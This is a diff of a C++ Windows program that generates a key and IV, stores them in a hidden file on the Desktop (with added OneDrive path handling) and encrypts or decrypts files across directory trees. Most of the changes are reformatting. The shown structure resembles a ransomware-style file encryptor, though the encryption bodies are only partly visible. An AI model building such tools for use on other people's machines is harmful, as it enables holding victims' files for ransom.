@@ -12,15 +12,16 @@ namespace fs = std::filesystem;
 
 const int size = 16;
 
-//This function is used to retrieve the username.
-std::string getCurrentUsername() {
+// This function is used to retrieve the username.
+std::string getCurrentUsername()
+{
     char username[UNLEN + 1];
     DWORD username_len = UNLEN + 1;
     GetUserNameA(username, &username_len);
     return std::string(username);
 }
 
-//This function is used to generate a random key and IV
+// This function is used to generate a random key and IV
 void generateKeyAndIV(uint8_t *key, uint8_t *iv, int size)
 {
     std::random_device rd;
@@ -36,7 +37,7 @@ void generateKeyAndIV(uint8_t *key, uint8_t *iv, int size)
     }
 }
 
-//This function is used to save data to a file.
+// This function is used to save data to a file.
 void saveToFile(const std::string &filename, const uint8_t *data, int size)
 {
     std::ofstream file(filename, std::ios::binary);
@@ -47,7 +48,7 @@ void saveToFile(const std::string &filename, const uint8_t *data, int size)
     }
 }
 
-//This function is used to read data from a file.
+// This function is used to read data from a file.
 void readFromFile(const std::string &filename, uint8_t *data, int size)
 {
     std::ifstream file(filename, std::ios::binary);
@@ -58,44 +59,59 @@ void readFromFile(const std::string &filename, uint8_t *data, int size)
     }
 }
 
-void saveKeyAndIVToDesktop(const std::string& filename, uint8_t* keyData, uint8_t* ivData, int size) 
+void saveKeyAndIVToDesktop(const std::string &filename, uint8_t *keyData, uint8_t *ivData, int size)
 {
     std::string username = getCurrentUsername();
     std::string path = "C:\\Users\\" + username + "\\";
-    std::string DesktopPath = path + "Desktop" + "\\";
+    std::string OneDrivePath = path + "OneDrive" + "\\";
+    std::string DesktopPath = OneDrivePath + "Desktop" + "\\";
+
+    if (fs::exists(OneDrivePath) && fs::is_directory(OneDrivePath) && !fs::exists(DesktopPath))
+    {
+        DesktopPath = path + "Desktop" + "\\";
+    }
 
     std::ofstream file(DesktopPath + filename, std::ios::binary);
-    if (file.is_open()) {
+    if (file.is_open())
+    {
         // Write key data
-        file.write(reinterpret_cast<const char*>(keyData), size);
+        file.write(reinterpret_cast<const char *>(keyData), size);
         // Write IV data
-        file.write(reinterpret_cast<const char*>(ivData), size);
-        
+        file.write(reinterpret_cast<const char *>(ivData), size);
+
         file.close();
 
         // Set file attribute to hidden
-        if (SetFileAttributes((DesktopPath + filename).c_str(), FILE_ATTRIBUTE_HIDDEN));
+        if (SetFileAttributes((DesktopPath + filename).c_str(), FILE_ATTRIBUTE_HIDDEN))
+            ;
     }
 }
 
-void readKeyAndIVFromDesktop(const std::string& filename, uint8_t* keyData, uint8_t* ivData, int size) 
+void readKeyAndIVFromDesktop(const std::string &filename, uint8_t *keyData, uint8_t *ivData, int size)
 {
     std::string username = getCurrentUsername();
     std::string path = "C:\\Users\\" + username + "\\";
-    std::string DesktopPath = path + "Desktop" + "\\";
+    std::string OneDrivePath = path + "OneDrive" + "\\";
+    std::string DesktopPath = OneDrivePath + "Desktop" + "\\";
+
+    if (fs::exists(OneDrivePath) && fs::is_directory(OneDrivePath) && !fs::exists(DesktopPath))
+    {
+        DesktopPath = path + "Desktop" + "\\";
+    }
 
     std::ifstream file(DesktopPath + filename, std::ios::binary);
-    if (file.is_open()) {
+    if (file.is_open())
+    {
         // Write key data
         file.read(reinterpret_cast<char *>(keyData), size);
         // Write IV data
         file.read(reinterpret_cast<char *>(ivData), size);
-        
+
         file.close();
     }
 }
 
-void deleteKeyAndIV(const std::string& filename) 
+void deleteKeyAndIV(const std::string &filename)
 {
     std::string username = getCurrentUsername();
     std::string path = "C:\\Users\\" + username + "\\";
@@ -108,17 +124,17 @@ bool filesExist(const std::string &file)
     std::string username = getCurrentUsername();
     std::string path = "C:\\Users\\" + username + "\\";
     std::string DesktopPath = path + "Desktop" + "\\";
-    return fs::exists(DesktopPath+file);
+    return fs::exists(DesktopPath + file);
 }
 
-//Declare the FileItem struct.
+// Declare the FileItem struct.
 struct FileItem
 {
     std::string name;
     bool isDirectory;
 };
 
-//This function is used to list files and directories.
+// This function is used to list files and directories.
 std::vector<FileItem> listFilesAndDirectories(const std::string &path, bool skipNonAccessible = false)
 {
     std::vector<FileItem> result;
@@ -126,12 +142,15 @@ std::vector<FileItem> listFilesAndDirectories(const std::string &path, bool skip
     {
         for (const auto &entry : fs::directory_iterator(path))
         {
-            if (skipNonAccessible) {
-                try {
+            if (skipNonAccessible)
+            {
+                try
+                {
                     fs::directory_iterator test(entry.path());
                 }
-                catch(const std::exception& e) {
-                    //std::cerr << "Error opening directory: " << entry.path().string() << std::endl;
+                catch (const std::exception &e)
+                {
+                    // std::cerr << "Error opening directory: " << entry.path().string() << std::endl;
                     continue; // Skip this iteration and move to the next one
                 }
             }
@@ -148,12 +167,12 @@ std::vector<FileItem> listFilesAndDirectories(const std::string &path, bool skip
     }
     catch (const fs::filesystem_error &e)
     {
-        //std::cerr << "Error: " << e.what() << std::endl;
+        // std::cerr << "Error: " << e.what() << std::endl;
     }
     return result;
 }
 
-//This function is used to increase the size of a string to the nearest multiple of 16.
+// This function is used to increase the size of a string to the nearest multiple of 16.
 std::string increaseSizeofString(const std::string &input)
 {
     size_t currentSize = input.size();
@@ -165,7 +184,7 @@ std::string increaseSizeofString(const std::string &input)
     return input;
 }
 
-//This function is used to read the content of a file into a single string.
+// This function is used to read the content of a file into a single string.
 std::string readFiles(const std::string &filePath)
 {
     std::ifstream file(filePath, std::ios::binary);
@@ -191,7 +210,7 @@ std::string readFiles(const std::string &filePath)
     return fileContent;
 }
 
-//This function is used to encrypt files.
+// This function is used to encrypt files.
 void enc(const std::vector<FileItem> &items, const std::string &prefix, const std::string &currentPath, const uint8_t *key, const uint8_t *iv)
 {
     for (const auto &item : items)
@@ -224,7 +243,7 @@ void enc(const std::vector<FileItem> &items, const std::string &prefix, const st
     }
 }
 
-//This function is used to decrypt files.
+// This function is used to decrypt files.
 void dec(const std::vector<FileItem> &items, const std::string &prefix, const std::string &currentPath, const uint8_t *key, const uint8_t *iv)
 {
     for (const auto &item : items)
